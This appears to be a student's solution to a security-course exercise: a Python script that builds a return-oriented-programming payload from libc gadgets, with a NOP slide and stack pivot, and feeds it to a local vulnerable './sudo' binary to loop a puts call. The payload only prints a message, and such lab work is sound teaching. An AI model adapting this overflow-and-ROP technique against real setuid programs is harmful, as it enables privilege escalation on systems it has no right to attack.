import os, sys

import addresses
import assemble
from search import GadgetSearch
import struct


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    address_of_puts = struct.pack("<I", addresses.PUTS)

    nop_slide = "\x90"*66

    skip_4_bytes = struct.pack("<I", int(search.find_format("add esp, 4")[1],16))

    put_puts_in_ebp = struct.pack("<I",int(search.find_format("pop ebp")[1],16)) + address_of_puts

    go_back_loop = struct.pack("<I", int(search.find_format("pop esp")[1],16)) + struct.pack("<I", addresses.START_OF_BUFFER + len(nop_slide)+ len(put_puts_in_ebp))    

    string = get_string("311453427")

    address_of_string = struct.pack(   "<I", addresses.START_OF_BUFFER  + len(nop_slide) + len(put_puts_in_ebp) + len(address_of_puts) + len(skip_4_bytes) + 4 + len(go_back_loop)   )



    return  nop_slide  + put_puts_in_ebp + address_of_puts + skip_4_bytes + address_of_string + go_back_loop + string


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
